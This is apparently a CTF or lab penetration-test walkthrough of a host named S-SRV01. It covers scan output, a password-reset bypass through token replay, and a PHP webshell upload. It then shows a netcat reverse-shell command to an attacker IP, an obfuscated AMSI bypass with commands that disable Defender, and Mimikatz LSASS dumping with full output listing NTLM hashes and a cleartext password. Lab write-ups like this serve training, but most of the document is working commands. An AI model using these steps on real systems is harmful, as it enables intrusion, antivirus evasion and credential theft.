## S-SRV01
IP: 10.200.111.31
* * *
## RUSTSCAN
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 47a528c37ffae5de41212fd204d19b1c (RSA)
|   256 6d59463a07b1bba7b390031d7ee5d42a (ECDSA)
|_  256 fb910ca0229a48947b748fd38d0a740b (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 21 disallowed entries (15 shown)
| /var/www/wordpress/index.php
| /var/www/wordpress/readme.html /var/www/wordpress/wp-activate.php
| /var/www/wordpress/wp-blog-header.php /var/www/wordpress/wp-config.php
| /var/www/wordpress/wp-content /var/www/wordpress/wp-includes
| /var/www/wordpress/wp-load.php /var/www/wordpress/wp-mail.php
| /var/www/wordpress/wp-signup.php /var/www/wordpress/xmlrpc.php
| /var/www/wordpress/license.txt /var/www/wordpress/upgrade
|_/var/www/wordpress/wp-admin /var/www/wordpress/wp-comments-post.php
|_http-generator: WordPress 5.5.3
|_http-title: holo.live
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000
* * *
## Webdirectories
Target: http://S-SRV01/

[15:16:18] Starting:
[15:16:19] 403 -  297B  - /%3f/
[15:16:19] 403 -  297B  - /%C0%AE%C0%AE%C0%AF
[15:16:19] 403 -  297B  - /%ff
[15:16:22] 403 -  297B  - /.ht_wsr.txt
[15:16:22] 403 -  297B  - /.htaccess.bak1
[15:16:22] 403 -  297B  - /.htaccess.orig
[15:16:22] 403 -  297B  - /.htaccess.save
[15:16:22] 403 -  297B  - /.htaccess.sample
[15:16:22] 403 -  297B  - /.htaccess_sc
[15:16:22] 403 -  297B  - /.htaccess_orig
[15:16:22] 403 -  297B  - /.htaccess_extra
[15:16:22] 403 -  297B  - /.htaccessBAK
[15:16:22] 403 -  297B  - /.htm
[15:16:22] 403 -  297B  - /.htaccessOLD
[15:16:22] 403 -  297B  - /.htpasswds
[15:16:22] 403 -  297B  - /.httr-oauth
[15:16:22] 403 -  297B  - /.htaccessOLD2
[15:16:22] 403 -  297B  - /.htpasswd_test
[15:16:22] 403 -  297B  - /.html
[15:16:46] 403 -  297B  - /cgi-bin/
[15:16:46] 200 -    2KB - /cgi-bin/printenv.pl
[15:16:54] 503 -  397B  - /examples/
[15:16:54] 503 -  397B  - /examples/servlet/SnoopServlet
[15:16:54] 503 -  397B  - /examples/jsp/snp/snoop.jsp
[15:16:54] 503 -  397B  - /examples/jsp/index.html
[15:16:54] 503 -  397B  - /examples/websocket/index.xhtml
[15:16:54] 503 -  397B  - /examples/servlets/index.html
[15:16:54] 503 -  397B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[15:16:54] 503 -  397B  - /examples/servlets/servlet/CookieExample
[15:16:54] 503 -  397B  - /examples
[15:16:54] 503 -  397B  - /examples/servlets/servlet/RequestHeaderExample
[15:16:56] 200 -    2KB - /home.php
[15:16:57] 301 -  328B  - /images  ->  http://s-srv01/images/
[15:16:57] 200 -  768B  - /images/
[15:16:58] 301 -  325B  - /img  ->  http://s-srv01/img/
[15:16:58] 403 -  297B  - /index.php::$DATA
[15:17:01] 200 -  208B  - /login.php
[15:17:08] 403 -  416B  - /phpmyadmin
[15:17:10] 403 -  416B  - /phpmyadmin/index.php
[15:17:10] 403 -  416B  - /phpmyadmin/ChangeLog
[15:17:10] 403 -  416B  - /phpmyadmin/phpmyadmin/index.php
[15:17:10] 403 -  416B  - /phpmyadmin/
[15:17:10] 403 -  416B  - /phpmyadmin/doc/html/index.html
[15:17:10] 403 -  416B  - /phpmyadmin/docs/html/index.html
[15:17:10] 403 -  416B  - /phpmyadmin/scripts/setup.php
[15:17:10] 403 -  416B  - /phpmyadmin/README
[15:17:16] 403 -  416B  - /server-info
[15:17:16] 403 -  416B  - /server-status
[15:17:16] 403 -  416B  - /server-status/
[15:17:23] 403 -  297B  - /Trace.axd::$DATA
[15:17:24] 200 -  553B  - /upload.php
[15:17:28] 403 -  297B  - /web.config::$DATA
[15:17:28] 200 -  169B  - /web.config
[15:17:28] 403 -  297B  - /webalizer
[15:17:28] 403 -  297B  - /webalizer/
[15:17:30] 200 -  766B  - /xampp/

* * *
## HTTP Enumeration
Website is pointing to "almost " a same site as the one on the L-SRV02 except that we can see now a reset password button..
![2552d75fc09b38badc315aa36f85cb35.png](../../../_resources/2552d75fc09b38badc315aa36f85cb35.png)

Knowing that we found admin user from the SQL on L-SRV01 and antoher user(Gurag) we can maybe try to reset it's password and use it to login to the server, hypotetically they are using it on the same webserver...

Launching a Password reset on the user gurag we see that website send us a email to user for reset but something seem strange. 
![a90ce5709998c0d6727e668b7ade2dab.png](../../../_resources/a90ce5709998c0d6727e668b7ade2dab.png)
Cheking the response code:
GET /password_reset.php?user=gurag&user_token= HTTP/1.1
Host: s-srv01
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://s-srv01/reset_form.php?
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=v5hbgvscsirjdd1bdahima66u9; user_token=db07d7a28fdfb93bdf43990cc143a91e4a113b1c2c556af654fb43759ee3e76169c01fd2f6fac0fa5c855b0e284997e358b9
Connection: close

We see that user is sent through http-get request but user_token is void, so we shoudl try to send back the request but with user_token as well
![399d19d160dd44fb8437e9bf159efa52.png](../../../_resources/399d19d160dd44fb8437e9bf159efa52.png)

Doing that we get redirected to reset.php where we can reset gurag account password:
![1435431ad8634fada61699cf2d3a737c.png](../../../_resources/1435431ad8634fada61699cf2d3a737c.png)

Now we have out flag:
![3254e8a96070ee12ad330cf1bb8bcbb2.png](../../../_resources/3254e8a96070ee12ad330cf1bb8bcbb2.png)
* * *
## Webshell
Login as gurag and you should be able to upload a php webshell:
![a1549210397a37d45eff9bc3138fa900.png](../../../_resources/a1549210397a37d45eff9bc3138fa900.png)

I used this one https://github.com/drag0s/php-webshell
And the file should be uploaded on under http://S-SRV01/images/
![32f117bea79b1874a7ab17e177618b82.png](../../../_resources/32f117bea79b1874a7ab17e177618b82.png)

Let's strat with some enumeration:
![187b20d60cdfcf49393276369127ae73.png](../../../_resources/187b20d60cdfcf49393276369127ae73.png)
![c24ec8d47a9f73ee79eacbac47cf1a37.png](../../../_resources/c24ec8d47a9f73ee79eacbac47cf1a37.png)

Seems like we are already Admins, so we can grab root.txt
![2afe47e07327311943a093e06c3d97c9.png](../../../_resources/2afe47e07327311943a093e06c3d97c9.png)

We must try to invoke a Revshell, so let's upload on the machine a nc.exe binary
![ffca722855a9785e0d020e9afc59b191.png](../../../_resources/ffca722855a9785e0d020e9afc59b191.png)

Now let's try to invoke a shell with ./nc.exe -e cmd 10.50.108.156 5555 
Bummer! It's not working!
Edit: After several try and catch i found a working PHP Revshell out of the box: https://github.com/ivan-sincek/php-reverse-shell
Probably it's caused by Windows XAMPP/LAMPP that doesn't like the old PHP Revshell from PentestMonkeys..

But now we have a revshell.
![16f815cf863f2a68b75ac156551e69da.png](../../../_resources/16f815cf863f2a68b75ac156551e69da.png)

We can ping our Kali that's good: 
C:\web\htdocs\images>ping 10.50.108.156

Pinging 10.50.108.156 with 32 bytes of data:
Reply from 10.50.108.156: bytes=32 time=48ms TTL=63
Reply from 10.50.108.156: bytes=32 time=49ms TTL=63
Reply from 10.50.108.156: bytes=32 time=48ms TTL=63
Reply from 10.50.108.156: bytes=32 time=48ms TTL=63

Ping statistics for 10.50.108.156:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 48ms, Maximum = 49ms, Average = 48ms

C:\web\htdocs\images>


## Root
Now that we have uploaded a static binary of Mimikatz.exe we can attempt to dump the credentials from LSASS.exe process
./mimikatz.exe 
"privilege::debug" 
"token::elevate" "sekurlsa::logonpasswords" 
exit

But we get message that exe have been removed from AV, so we need to patch AMSI:
`[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse

Set-MpPreference -DisableRealtimeMonitoring $true`

First commando is actually patching the ASMI
Second is removing AMSI traces from Registry
Third commando is Disabling Real time protection from Defender

**Mimikatz dump:**
mimikatz # privilege::debug


mimikatz # token::elevate
User name :
SID name  : NT AUTHORITY\SYSTEM

676     {0;000003e7} 1 D 21403          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 3594011     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,28p)       Primary
 * Thread Token  : {0;000003e7} 1 D 3633491     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # sekurlsa::logonpasswords
 233853 (00000000:0003917d)
Session           : Interactive from 1
User Name         : watamet
Domain            : HOLOLIVE
Logon Server      : DC-SRV01
Logon Time        : 1/4/2023 7:57:03 AM
SID               : S-1-5-21-471847105-3603022926-1728018720-1132
        msv :
         [00000003] Primary
         * Username : watamet
         * Domain   : HOLOLIVE
         * NTLM     : d8d41e6cf762a8c77776a1843d4141c9
         * SHA1     : 7701207008976fdd6c6be9991574e2480853312d
         * DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0
        tspkg :
        wdigest :
         * Username : watamet
         * Domain   : HOLOLIVE
         * Password : (null)
        kerberos :
         * Username : watamet
         * Domain   : HOLO.LIVE
         * Password : Nothingtoworry!
        ssp :
        credman :

Authentication Id : 0 ; 233592 (00000000:00039078)
Session           : Interactive from 1
User Name         : watamet
Domain            : HOLOLIVE
Logon Server      : DC-SRV01
Logon Time        : 1/4/2023 7:57:03 AM
SID               : S-1-5-21-471847105-3603022926-1728018720-1132
        msv :
         [00000003] Primary
         * Username : watamet
         * Domain   : HOLOLIVE
         * NTLM     : d8d41e6cf762a8c77776a1843d4141c9
         * SHA1     : 7701207008976fdd6c6be9991574e2480853312d
         * DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0
        tspkg :
        wdigest :
         * Username : watamet
         * Domain   : HOLOLIVE
         * Password : (null)
        kerberos :
         * Username : watamet
         * Domain   : HOLO.LIVE
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 45840 (00000000:0000b310)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/4/2023 7:56:54 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : S-SRV01$
         * Domain   : HOLOLIVE
         * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
         * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
        tspkg :
        wdigest :
         * Username : S-SRV01$
         * Domain   : HOLOLIVE
         * Password : (null)
        kerberos :
         * Username : S-SRV01$
         * Domain   : holo.live
         * Password : 9e 8e d8 e0 37 37 04 5f 38 08 bd 3e aa b5 41 58 87 d0 db 00 dd ce 62 58 8f ee aa 5c b8 0d 05 c5 34 a5 70 80 2d 50 8f 25 68 a8 23 dd 04 ea aa 5c a5 25 63 93 1b 06 c6 e2 f2 3f 6a 49 d5 ad a2 16 e4 df df 5e 36 aa 5f 6a ab 56 d1 c5 3a df 85 7f 80 79 8d 61 d0 35 d2 56 0a e4 c1 51 df fc f3 ab f3 a2 83 81 01 d9 b2 79 89 c5 0d d5 c7 ad 52 fc d4 db 59 fa 04 95 22 3f 5d 21 f3 b4 10 0f ec 0b 04 c4 7b d9 f8 b6 08 de 83 de 7a 3f 37 48 40 e2 31 fe 85 9d 9c 4c 90 8c 41 55 29 14 0d 67 6a c1 68 66 ff cc f9 bc 19 56 a9 4a b9 60 c9 05 aa 0f 5b 96 d5 1f d2 1f 02 52 37 a2 8d 5c 1e da fb 2c 27 20 f3 6b 76 a1 66 b4 d3 d5 f2 28 11 08 26 83 4a d6 a6 3a 62 86 02 53 ee d9 a6 4e 44 6d 93 e4 ac 10 28 ee ae 4c b8 ba 52 09 e2 dc 7e 40 fd ef
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : S-SRV01$
Domain            : HOLOLIVE
Logon Server      : (null)
Logon Time        : 1/4/2023 7:56:54 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : S-SRV01$
         * Domain   : HOLOLIVE
         * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
         * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
        tspkg :
        wdigest :
         * Username : S-SRV01$
         * Domain   : HOLOLIVE
         * Password : (null)
        kerberos :
         * Username : s-srv01$
         * Domain   : HOLO.LIVE
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 27482 (00000000:00006b5a)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/4/2023 7:56:54 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : S-SRV01$
         * Domain   : HOLOLIVE
         * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
         * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
        tspkg :
        wdigest :
         * Username : S-SRV01$
         * Domain   : HOLOLIVE
         * Password : (null)
        kerberos :
         * Username : S-SRV01$
         * Domain   : holo.live
         * Password : 9e 8e d8 e0 37 37 04 5f 38 08 bd 3e aa b5 41 58 87 d0 db 00 dd ce 62 58 8f ee aa 5c b8 0d 05 c5 34 a5 70 80 2d 50 8f 25 68 a8 23 dd 04 ea aa 5c a5 25 63 93 1b 06 c6 e2 f2 3f 6a 49 d5 ad a2 16 e4 df df 5e 36 aa 5f 6a ab 56 d1 c5 3a df 85 7f 80 79 8d 61 d0 35 d2 56 0a e4 c1 51 df fc f3 ab f3 a2 83 81 01 d9 b2 79 89 c5 0d d5 c7 ad 52 fc d4 db 59 fa 04 95 22 3f 5d 21 f3 b4 10 0f ec 0b 04 c4 7b d9 f8 b6 08 de 83 de 7a 3f 37 48 40 e2 31 fe 85 9d 9c 4c 90 8c 41 55 29 14 0d 67 6a c1 68 66 ff cc f9 bc 19 56 a9 4a b9 60 c9 05 aa 0f 5b 96 d5 1f d2 1f 02 52 37 a2 8d 5c 1e da fb 2c 27 20 f3 6b 76 a1 66 b4 d3 d5 f2 28 11 08 26 83 4a d6 a6 3a 62 86 02 53 ee d9 a6 4e 44 6d 93 e4 ac 10 28 ee ae 4c b8 ba 52 09 e2 dc 7e 40 fd ef
        ssp :
        credman :

Authentication Id : 0 ; 26090 (00000000:000065ea)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 1/4/2023 7:56:53 AM
SID               :
        msv :
         [00000003] Primary
         * Username : S-SRV01$
         * Domain   : HOLOLIVE
         * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
         * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/4/2023 7:56:58 AM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/4/2023 7:56:54 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 45738 (00000000:0000b2aa)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/4/2023 7:56:54 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : S-SRV01$
         * Domain   : HOLOLIVE
         * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
         * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
        tspkg :
        wdigest :
         * Username : S-SRV01$
         * Domain   : HOLOLIVE
         * Password : (null)
        kerberos :
         * Username : S-SRV01$
         * Domain   : holo.live
         * Password : 9e 8e d8 e0 37 37 04 5f 38 08 bd 3e aa b5 41 58 87 d0 db 00 dd ce 62 58 8f ee aa 5c b8 0d 05 c5 34 a5 70 80 2d 50 8f 25 68 a8 23 dd 04 ea aa 5c a5 25 63 93 1b 06 c6 e2 f2 3f 6a 49 d5 ad a2 16 e4 df df 5e 36 aa 5f 6a ab 56 d1 c5 3a df 85 7f 80 79 8d 61 d0 35 d2 56 0a e4 c1 51 df fc f3 ab f3 a2 83 81 01 d9 b2 79 89 c5 0d d5 c7 ad 52 fc d4 db 59 fa 04 95 22 3f 5d 21 f3 b4 10 0f ec 0b 04 c4 7b d9 f8 b6 08 de 83 de 7a 3f 37 48 40 e2 31 fe 85 9d 9c 4c 90 8c 41 55 29 14 0d 67 6a c1 68 66 ff cc f9 bc 19 56 a9 4a b9 60 c9 05 aa 0f 5b 96 d5 1f d2 1f 02 52 37 a2 8d 5c 1e da fb 2c 27 20 f3 6b 76 a1 66 b4 d3 d5 f2 28 11 08 26 83 4a d6 a6 3a 62 86 02 53 ee d9 a6 4e 44 6d 93 e4 ac 10 28 ee ae 4c b8 ba 52 09 e2 dc 7e 40 fd ef
        ssp :
        credman :

Authentication Id : 0 ; 27378 (00000000:00006af2)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/4/2023 7:56:53 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : S-SRV01$
         * Domain   : HOLOLIVE
         * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
         * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
        tspkg :
        wdigest :
         * Username : S-SRV01$
         * Domain   : HOLOLIVE
         * Password : (null)
        kerberos :
         * Username : S-SRV01$
         * Domain   : holo.live
         * Password : 9e 8e d8 e0 37 37 04 5f 38 08 bd 3e aa b5 41 58 87 d0 db 00 dd ce 62 58 8f ee aa 5c b8 0d 05 c5 34 a5 70 80 2d 50 8f 25 68 a8 23 dd 04 ea aa 5c a5 25 63 93 1b 06 c6 e2 f2 3f 6a 49 d5 ad a2 16 e4 df df 5e 36 aa 5f 6a ab 56 d1 c5 3a df 85 7f 80 79 8d 61 d0 35 d2 56 0a e4 c1 51 df fc f3 ab f3 a2 83 81 01 d9 b2 79 89 c5 0d d5 c7 ad 52 fc d4 db 59 fa 04 95 22 3f 5d 21 f3 b4 10 0f ec 0b 04 c4 7b d9 f8 b6 08 de 83 de 7a 3f 37 48 40 e2 31 fe 85 9d 9c 4c 90 8c 41 55 29 14 0d 67 6a c1 68 66 ff cc f9 bc 19 56 a9 4a b9 60 c9 05 aa 0f 5b 96 d5 1f d2 1f 02 52 37 a2 8d 5c 1e da fb 2c 27 20 f3 6b 76 a1 66 b4 d3 d5 f2 28 11 08 26 83 4a d6 a6 3a 62 86 02 53 ee d9 a6 4e 44 6d 93 e4 ac 10 28 ee ae 4c b8 ba 52 09 e2 dc 7e 40 fd ef
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : S-SRV01$
Domain            : HOLOLIVE
Logon Server      : (null)
Logon Time        : 1/4/2023 7:56:53 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : S-SRV01$
         * Domain   : HOLOLIVE
         * Password : (null)
        kerberos :
         * Username : s-srv01$
         * Domain   : HOLO.LIVE
         * Password : (null)
        ssp :
        credman :

Now we are ready and we can move forward to PC-FILESRV01.
